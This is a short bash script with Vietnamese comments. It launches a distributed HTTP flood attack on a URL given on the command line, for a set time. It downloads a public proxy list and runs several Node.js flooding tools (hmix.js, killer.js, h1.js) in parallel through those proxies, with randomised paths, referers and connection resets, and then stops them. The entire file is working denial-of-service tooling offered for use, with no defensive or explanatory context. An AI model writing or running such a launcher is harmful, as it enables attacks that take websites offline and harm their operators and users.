#!/bin/bash

# Usage: ./script.sh <URL> <TIME> 
[ $# -lt 2 ] && echo "Usage: $0 {URL} {TIME}" && exit 1

URL=$1
TIME=$2

# Tải proxy loại HTTP, HTTPS, SOCKS4, SOCKS5 vào live.txt 
for type in http; do
  curl -s "https://proxyspace.pro/${type}.txt"
done > live.txt

node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &

node killer.js POST "$URL" "$TIME" 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &

node h1.js POST "$URL" live.txt "$TIME" 999 10 randomstring="true" &
node h1.js GET "$URL" live.txt "$TIME" 999 10 randomstring="true" &


wait
pkill -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js"
